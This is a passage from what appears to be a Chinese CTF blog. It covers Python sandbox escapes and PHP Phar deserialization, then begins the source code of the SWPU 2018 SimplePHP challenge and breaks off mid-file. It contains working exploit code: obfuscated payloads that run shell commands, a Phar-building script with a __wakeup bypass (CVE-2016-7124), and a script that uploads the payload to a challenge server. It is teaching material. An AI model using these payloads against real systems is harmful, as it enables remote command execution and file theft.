class="hljs-keyword">global</span>[<span class="hljs-string">&#x27;result&#x27;</span>]  <span class="hljs-comment"># extract the result</span><br>    <span class="hljs-keyword">return</span> result<br><br><br>banner()<br>while1:<br>    command = getexp()<br>    <span class="hljs-built_in">print</span> sandbox_exec(command)<br></code></pre></td></tr></table></figure><p><code>exec command in _global</code>这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__<br>restricted attribute<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>), <span class="hljs-string">&#x27;FileType&#x27;</span>)(<span class="hljs-string">&#x27;key&#x27;</span>), <span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>)()<br>file() constructor <span class="hljs-keyword">not</span> accessible <span class="hljs-keyword">in</span> restricted mode<br></code></pre></td></tr></table></figure><p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types,json 库，来执行任意命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>).__builtins__[<span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>]](<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;mets&#x27;</span><span class="hljs-string">&#x27;ys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">getattr</span>(().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>), <span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;yst&#x27;</span>+<span class="hljs-string">&#x27;em&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>两个payload本质区别在取导入的时不同的库</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Phar</title>
    <link href="/blog/2025/01/23/PHP/Phar/"/>
    <url>/blog/2025/01/23/PHP/Phar/</url>
    
    <content type="html"><![CDATA[<h2 id="Phar是什么"><a href="#Phar是什么" class="headerlink" title="Phar是什么"></a>Phar是什么</h2><p>Phar是一种文件打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。简单来说类似于ZIP和tar</p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><h3 id="1-stub文件标识"><a href="#1-stub文件标识" class="headerlink" title="1.stub文件标识"></a>1.stub文件标识</h3><ul><li>可以理解为一个标志，格式为xxx<code>&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件</li></ul><h3 id="2-manifest-（清单Phar里面内容信息）"><a href="#2-manifest-（清单Phar里面内容信息）" class="headerlink" title="2.manifest （清单Phar里面内容信息）"></a>2.manifest （清单Phar里面内容信息）</h3><ul><li>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存（当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化）</li></ul><h3 id="3-contents"><a href="#3-contents" class="headerlink" title="3. contents"></a>3. contents</h3><ul><li>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</li></ul><h3 id="4-signature（签名）"><a href="#4-signature（签名）" class="headerlink" title="4.signature（签名）"></a>4.signature（签名）</h3><ul><li>phar的最后有一段signature，是phar的签名，放在文件末尾，如果我们修改了文件的内容，之前的签名就会无效，就需要更换一个新的签名。在文件系统函数（file_exists()、is_dir()等详见下表）参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以不依赖unserialize()直接进行反序列化操作。</li></ul><h2 id="Phar和Phar伪协议使用环境"><a href="#Phar和Phar伪协议使用环境" class="headerlink" title="Phar和Phar伪协议使用环境"></a>Phar和Phar伪协议使用环境</h2><ul><li>php大于5.3.0</li><li>需要将php.ini的参数phar.readonly设置为off</li></ul><h2 id="如何生成一个Phar文件，下面是一个demo"><a href="#如何生成一个Phar文件，下面是一个demo" class="headerlink" title="如何生成一个Phar文件，下面是一个demo"></a>如何生成一个Phar文件，下面是一个demo</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Phar在CTF应用"><a href="#Phar在CTF应用" class="headerlink" title="Phar在CTF应用"></a>Phar在CTF应用</h2><ol><li><p>反序列化。php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下</p><table><thead><tr><th>受影响函数的列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeab</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table></li></ol><h4 id="以Newstar-2023-week5中-Unserialize-Again举例如何在ctf反序列化中应用"><a href="#以Newstar-2023-week5中-Unserialize-Again举例如何在ctf反序列化中应用" class="headerlink" title="以Newstar 2023 week5中 Unserialize Again举例如何在ctf反序列化中应用"></a>以Newstar 2023 week5中 Unserialize Again举例如何在ctf反序列化中应用</h4><p>题目具体函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;多吃雪梨&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>接受两个参数，其次file_get_contents(‘php:&#x2F;&#x2F;input’)接受用户POST方式提交过来的参数，将POST提交过来的参数解码放到$pear里面</p><p>，其次file_exists这个函数是检测文件或目录是否存在，但是$Adam使用phar:&#x2F;&#x2F;伪协议读取phar文件的话，自动执行<code>unserialize()</code>的操作没有依赖于<code>unserialize()</code>这个函数，而且正好在上面提及到受影响的函数中，我们最终的目标是</p><img src="/blog/2025/01/23/PHP/Phar/image-20250123202947693.png" class><p>接下来就是构造phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>&#125;                 <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其次需要<code>__wakeup()</code>因为<code>__wakeup()</code>会比<code>__destruct()</code>先执行</p><p>借助：属性个数不匹配(cve-2016-7124)来绕过</p><p>受影响版本：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><img src="/blog/2025/01/23/PHP/Phar/image-20250123202851640.png" class><p>将4修改为5</p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><ul><li><p>修改后phar的文件的签名就不管用了需要重新生成一个，需要一个新的签名，签名用sha1加密，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;hack.phar&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    text = f.read()<br>s = text[:-<span class="hljs-number">28</span>]<br>h = text[-<span class="hljs-number">8</span>:]<br>newf = s + sha1(s).digest() + h<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;hacker1.phar&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(newf)<br></code></pre></td></tr></table></figure></li></ul><p>接下来就是传数据了可以用python脚本，也可以直接传有点麻烦需要将phar文件内容经过url编码后，通过POST方式传过去最后GET传 ?pear&#x3D;hacker1.phar&amp;apple&#x3D;phar:&#x2F;&#x2F;hacker1.phar 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://83520740-e875-4e0e-904f-7dc11b8d2a3f.node5.buuoj.cn:81/&#x27;</span><br>params=&#123;<br>    <span class="hljs-string">&#x27;pear&#x27;</span>:<span class="hljs-string">&#x27;hacker1.phar&#x27;</span>, <br>    <span class="hljs-string">&#x27;apple&#x27;</span>:<span class="hljs-string">&#x27;phar://hacker1.phar&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;22.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f)<br>    fin=requests.post(url=url+<span class="hljs-string">&quot;pairing.php&quot;</span>,data=ff,params=params)<br>    <span class="hljs-built_in">print</span>(fin.text)<br></code></pre></td></tr></table></figure><h4 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="SWPU 2018-SimplePHP"></a>SWPU 2018-SimplePHP</h4><p>考点：php反序列化+phar</p><p>给了三个文件class.php,file.php,upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ 